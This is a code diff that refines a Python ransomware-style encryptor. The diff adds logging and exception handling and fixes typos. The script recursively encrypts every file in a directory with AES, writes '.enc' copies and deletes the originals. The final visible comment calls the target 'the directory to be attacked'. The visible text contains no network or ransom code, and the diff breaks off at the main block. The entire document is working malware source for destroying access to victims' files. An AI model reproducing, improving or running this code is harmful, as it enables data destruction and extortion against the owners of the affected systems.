@@ -1,6 +1,10 @@
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 import os
+import logging
+
+# Set up logging for error handling
+logging.basicConfig(filename="encryption_log.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 
 
 # generate a random 16-byte AES key 
@@ -13,42 +17,63 @@ def save_key_locally(key, file_path=".secret_key"):
     print(f"Encryption key saved to {file_path}")
 
 
-
-# function to encrypt a file 
+# Function to encrypt a file
 def encrypt_file(file_path, key):
-    # open the file passed 
-    with open(file_path, 'rb') as file:
-        # read the file as a plaintext 
-        plain_text = file.read()
+    try:
+        # Open the file passed
+        with open(file_path, 'rb') as file:
+            # Read the file as a plaintext
+            plain_text = file.read()
 
-    # intialize the AES cipher 
-    chiper = AES.new(key, AES.MODE_CFB)
+        # Initialize the AES cipher
+        cipher = AES.new(key, AES.MODE_CFB)
 
-    # encrypt the file content
-    chiper_text = chiper.encrypt(plain_text)
+        # Encrypt the file content
+        cipher_text = cipher.encrypt(plain_text)
 
-    # write the encrypted output file 
-    with open(file_path + ".enc", "wb") as encrypted_file:
-        # write the IV for decryption
-        encrypted_file.write(chiper.iv)
+        # Write the encrypted output file
+        enc_file_path = file_path + ".enc"
+        with open(enc_file_path, "wb") as encrypted_file:
+            # Write the IV for decryption
+            encrypted_file.write(cipher.iv)
 
-        # write the encrypted text
-        encrypted_file.write(chiper_text)
+            # Write the encrypted text
+            encrypted_file.write(cipher_text)
 
-    # delete the original file 
-    os.remove(file_path)
+        # Log successful encryption
+        logging.info(f"Encryption successful: {file_path} -> {enc_file_path}")
 
+        # Delete the original file after encryption
+        os.remove(file_path)
+        logging.info(f"Original file deleted: {file_path}")
 
+    except FileNotFoundError as e:
+        logging.error(f"File not found: {file_path} - {e}")
+    except PermissionError as e:
+        logging.error(f"Permission error accessing the file: {file_path} - {e}")
+    except Exception as e:
+        logging.error(f"Error during encryption for file {file_path}: {e}")
 
-# function to envrypt a whole directory 
-def encrypt_directory( directory, key):
-    # explore the give directory 
-    for root, dirs, files in os.walk(directory):
-        # iterate over the files 
-        for file in files:
-            # excute the encryption function on each file 
-            encrypt_file(os.path.join(root, file), key)
+# Function to encrypt a whole directory
+def encrypt_directory(directory, key):
+    try:
+        # Explore the given directory
+        for root, dirs, files in os.walk(directory):
+            # Iterate over the files
+            for file in files:
+                file_path = os.path.join(root, file)
+                try:
+                    # Execute the encryption function on each file
+                    encrypt_file(file_path, key)
+                except Exception as e:
+                    logging.error(f"Failed to encrypt file {file_path}: {e}")
 
+    except FileNotFoundError as e:
+        logging.error(f"Directory not found: {directory} - {e}")
+    except PermissionError as e:
+        logging.error(f"Permission error accessing directory: {directory} - {e}")
+    except Exception as e:
+        logging.error(f"Error during directory encryption: {e}")
 
 if __name__ == "__main__":
     # pass the directory to be attacked
